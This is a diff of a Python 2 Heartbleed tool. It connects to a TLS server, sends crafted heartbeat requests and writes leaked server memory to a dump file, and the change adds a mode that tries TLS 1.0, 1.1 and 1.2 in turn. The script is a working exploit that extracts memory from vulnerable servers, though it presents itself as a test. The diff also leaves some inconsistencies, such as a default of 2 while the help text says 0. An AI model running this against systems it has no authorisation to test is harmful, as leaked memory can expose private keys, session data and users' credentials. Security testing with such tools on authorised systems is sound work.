@@ -16,7 +16,7 @@ options = OptionParser(usage='%prog server [options]', description='Test for SSL
 options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
 options.add_option('-n', '--num', type='int', default=1, help='Number of heartbeats to send if vulnerable (defines how much memory you get back) (default: 1)')
 options.add_option('-f', '--file', type='str', default='dump.bin', help='Filename to write dumped memory too (default: dump.bin)')
-options.add_option('-v', '--ver', type='int', default=2, help='TLS version 1 is 1.0, 2 is 1.1, 3 is 1.2 (default: 2)')
+options.add_option('-v', '--ver', type='int', default=2, help='TLS version 1 is 1.0, 2 is 1.1, 3 is 1.2, 0 will try all (default: 0)')
 
 dumpf = 'dump.bin'
 
@@ -122,43 +122,66 @@ def hit_hb(s):
 			print 'Server returned error, likely not vulnerable'
 			return False
 
-def main():
-	opts, args = options.parse_args()
-	if len(args) < 1:
-		options.print_help()
-		return
-	
-	dumpf = opts.file
+def connect(host, port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	print 'Connecting...'
 	sys.stdout.flush()
-	s.connect((args[0], opts.port))
+	s.connect((host, port))
 	print 'Sending Client Hello...'
 	sys.stdout.flush()
 	s.send(hello)
 	print 'Waiting for Server Hello...'
 	sys.stdout.flush()
+	return s
+
+def parseresp(s):
 	while True:
 		typ, ver, pay = recvmsg(s)
 		if typ == None:
 			print 'Server closed connection without sending Server Hello.'
-			return
+			return False
 		# Look for server hello done message.
 		if typ == 22 and ord(pay[0]) == 0x0E:
-			break
+			return True
 
+def check(host, port, version):
+	response = False
+	s = connect(host, port)	
+	if not parseresp(s):
+		return
 	print 'Sending heartbeat request...'
 	sys.stdout.flush()
+	if (version == 1):
+		s.send(hbv10)
+		response = hit_hb(s)
+	if (version == 2):
+		s.send(hbv11)
+		response = hit_hb(s)
+	if (version == 3):
+		s.send(hbv12)
+		response = hit_hb(s)
+	s.close()
+	return response
+	
+def main():
+	opts, args = options.parse_args()
+	if len(args) < 1:
+		options.print_help()
+		return
+
+	dumpf = opts.file
 	for i in xrange(0,opts.num):
-		if (opts.ver == 1):
-			s.send(hbv10)
-			hit_hb(s)
-		if (opts.ver == 2):
-			s.send(hbv11)
-			hit_hb(s)
-		if (opts.ver == 3):
-			s.send(hbv12)
-			hit_hb(s)
+		check(args[0], opts.port, opts.ver)	
+		if (opts.ver == 0):
+			one = 0
+			two = 0
+			three = 0
+			one = check(args[0], opts.port, 1)
+			two = check(args[0], opts.port, 2)
+			three = check(args[0], opts.port, 3)
+			if one: print 'TLS v1.0 is Vulnerable'
+			if two: print 'TLS v1.1 is Vulnerable'
+			if three: print 'TLS v1.2 is Vulnerable'
 
 if __name__ == '__main__':
 	main()
